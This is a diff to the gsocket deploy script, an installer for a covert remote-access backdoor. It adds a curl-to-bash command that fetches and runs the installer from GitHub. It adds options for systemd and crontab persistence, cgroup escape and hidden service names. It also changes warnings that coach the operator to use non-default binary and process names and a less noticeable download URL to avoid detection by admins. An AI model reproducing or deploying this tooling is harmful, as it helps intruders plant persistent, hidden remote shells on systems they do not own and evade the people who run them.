@@ -6,6 +6,7 @@
 #
 # This script is typically invoked like this as root or non-root user:
 #   $ bash -c "$(curl -fsSL https://gsocket.io/y)"
+#   $ bash -c "$(curl -fsSL https://github.com/hackerschoice/binary/raw/refs/heads/main/gsocket/y)"
 #
 # Connect
 #   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/y)"
@@ -49,6 +50,10 @@
 #       - Do not fast forward to a small pid.
 # GS_NOREEXEC=1
 #       - Do not re-exec or change argv0.
+# GS_NOCCG=1
+#       - Do not change cgroup (for systemd)
+# GS_NOSYSTEMD=1
+#       - Do not install systemd service
 # GS_NOCRONTAB=1
 #       - Disable crontab persistency (do not install in crontab).
 # GS_NOLINEHIDING=1
@@ -205,7 +210,7 @@ CONFIG_DIR_NAME_DEFAULT="${config_dir_name_arr[$((RANDOM % ${#config_dir_name_ar
 # GS_NOTE=1
 GS_FFPID=1
 GS_REEXEC=1
-GS_SYSTEMD_PERSIST="oneshot"
+[ -z "$GS_SYSTEMD_PERSIST" ] && GS_SYSTEMD_PERSIST="oneshot"
 GS_MEMEXEC=1
 #GS_SYSTEMD_PERSIST="default"
 
@@ -252,6 +257,7 @@ res=$(command -v cron) && {
 # Names for 'uninstall' (including names from previous versions)
 BIN_HIDDEN_NAME_RM=("${bin_hidden_name_arr[@]}" "core" "defunct" "gs-dbus" "gs-db")
 CONFIG_DIR_NAME_RM=("${config_dir_name_arr[@]}" "htop" "dbus")
+service_hidden_name_arr_rm=("${service_hidden_name_arr[@]}" "defunct" "gs-dbus" "gs-db")
 
 [[ -t 1 ]] && {
 	CY="\033[1;33m" # yellow
@@ -268,6 +274,7 @@ CONFIG_DIR_NAME_RM=("${config_dir_name_arr[@]}" "htop" "dbus")
 	CF="\033[2m"    # faint
 	CN="\033[0m"    # none
 	CW="\033[1;37m"
+	CUL="\e[4m"	 # underline
 	CRY="\e[0;33;41m"  # YELLOW on RED (warning)
 }
 
@@ -1146,9 +1153,9 @@ _config2bin_tmpfile() {
 	[[ -n "$LDSO" ]] && exec_arr=("$LDSO")
 	exec_arr+=("${src}")
 	GS_CONFIG_WRITE="${dst}" "${exec_arr[@]}" || return 255
-	[[ -n "$dst_final" ]] && {
+	[ -n "$dst_final" ] && {
 		cat "${dst}" >"${dst_final}"
-		rm -f "${dst:?}"
+		rm -f "${dst:?}" # .tmp file
 	}
 
 	return 0
@@ -1316,7 +1323,7 @@ uninstall()
 	done
 	unset fn
 
-	for hn in "${SERVICE_HIDDEN_NAME}" "${service_hidden_name_arr[@]}"; do
+	for hn in "${SERVICE_HIDDEN_NAME}" "${service_hidden_name_arr_rm[@]}"; do
 		uninstall_service "${SERVICE_DIR}" "${hn}" # SERVICE_HIDDEN_NAME
 	done
 
@@ -1603,6 +1610,11 @@ install_systemd_add() {
 install_systemd_new() {
 	local sfdata
 	local param
+	local remain="no"
+
+	# If gsnc does not leave cgroup then we must keep sevice running or else
+	# systemd will kill the entire cgroup.
+	[ -n "$GS_NOCCG" ] && remain="yes" 
 
 	if [[ "$GS_SYSTEMD_PERSIST" == *"oneshot"* ]]; then
 		sfdata="[Unit]
@@ -1610,15 +1622,15 @@ After=network.target
 
 [Service]
 Type=oneshot
-RemainAfterExit=no
+RemainAfterExit=${remain}
 ExecStart=${DSTBIN}
 
 [Install]
 WantedBy=multi-user.target"
 		param="-ilqD"
-		GS_CCG=1 # Change CGROUP
+		[ -z "$GS_NOCCG" ] && GS_CCG=1 # Change CGROUP
 	else 
-		# HERE: the default is a systemd supervised service
+		# HERE: A systemd supervised service
 		sfdata="[Unit]
 After=network.target
 
@@ -1749,7 +1761,7 @@ install_system_rclocal()
 install_system()
 {
 	# Try systemd first
-	install_system_systemd && return
+	[ -z "$GS_NOSYSTEMD" ] && install_system_systemd && return
 
 	# Try good old /etc/rc.local
 	install_system_rclocal || { 
@@ -2193,17 +2205,18 @@ gs_start_systemd()
 	# is needed. Thus fix Timestamp first and then reload.
 	ts_restore
 	systemctl daemon-reload
-	err=1
-	systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null && {
-		if [[ -n "$SYSTEMD_INSTALL_CHECK_IS_ACTIVE" ]]; then
-			systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null && unset err
-		else
-			# Hope for the best that OneShot worked correctly.
-			unset err
-		fi
-	}
-	[[ -n "$err" ]] && {
-		FAIL_OUT "Check ${CM}systemctl status ${SERVICE_HIDDEN_NAME}${CN}."
+	# err=1
+	# Rare case with Type=oneshot but gsnc fails to leave cgroup (and thus does
+	# not fork/setsid). Use timeout or otherwise systemctl would never return.
+	err="$(timeout 5 systemctl restart "${SERVICE_HIDDEN_NAME}" 2>&1)"
+	if [[ -n "$SYSTEMD_INSTALL_CHECK_IS_ACTIVE" ]]; then
+		err="$(systemctl is-active "${SERVICE_HIDDEN_NAME}" 2>/dev/null)" && unset err
+	# else
+		# Hope for the best that OneShot worked correctly.
+		# unset err
+	fi
+	[ -n "$err" ] && {
+		FAIL_OUT "$err: Check ${CM}systemctl status ${SERVICE_HIDDEN_NAME}${CN}."
 		exit 255
 	}
 	IS_GS_RUNNING=1
@@ -2332,11 +2345,13 @@ gs_start
 # Give gsnc enough time to read the configuration from its own binary before deleting.
 [[ -n "$GS_NOINST" ]] && { sleep 1; rm -f "${DSTBIN:?}"; }
 
+[ -n "$IS_SYSTEMD" ] && [ "$(ip netns identify 2>/dev/null)" != "$(nsenter -t1 -n ip netns identify 2>/dev/null)" ] && WARN "Network namespace differs. May need to use ${CDY}ExecStart=ip netns exec $(ip netns identify) ${DSTBIN}${CN} #${CRY}PLEASE REPORT THIS${CN}" 
+
 # Default values are known and easily detected by users/admins.
 { [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "Using default names is easily detectable. Set these for more stealth
     ${CB}GS_BIN='<filename>'${CN}
     ${CDC}GS_NAME='<processname>'${CN}"
-[[ "$GS_URL_DEPLOY" == "https://gsocket.io"* ]] || true && {
+[[ "$GS_URL_DEPLOY" == "https://gsocket.io"* ]] && {
 	unset str
 	url="https://github.com/hackerschoice/binary/raw/refs/heads/main/gsocket"
 	[ -n "$GS_BRANCH" ] && url+="/$GS_BRANCH"
@@ -2344,7 +2359,7 @@ gs_start
 	# [ -n "$GS_PORT" ] && str+="GS_PORT=$GS_PORT "
 	# [ -n "$GS_BEACON" ] && str+="GS_BEACON=$GS_BEACON "
 	# [ -n "$X" ] && str+="X=$X "
-	WARN "Using ${CY}${CF}https://gsocket.io/y${CN} is noticeable. Better use
+	WARN "Using ${CB}${CUL}https://gsocket.io/y${CN} is noticeable. Better use
     ${CM}${str}bash -c \"\$(curl -fsSL ${url}/${SCRIPT_DEPLOY_NAME})\"${CN}
     ${CM}${str}bash -c \"\$(wget -qO-  ${url}/${SCRIPT_DEPLOY_NAME})\"${CN}"
 }
